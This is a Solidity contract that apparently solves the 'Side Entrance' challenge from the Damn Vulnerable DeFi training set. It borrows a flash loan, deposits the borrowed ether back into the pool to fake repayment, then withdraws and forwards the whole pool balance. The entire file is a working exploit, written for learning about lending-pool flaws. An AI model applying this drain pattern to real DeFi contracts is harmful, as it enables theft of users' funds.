// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackSideEntrance is IFlashLoanEtherReceiver {
    using Address for address payable;

    receive() external payable {}

    function executeFlashLoan(address pool, uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function withdraw(address pool, address recipient) external {
        SideEntranceLenderPool(pool).withdraw();
        payable(recipient).sendValue(address(this).balance);
    }
}
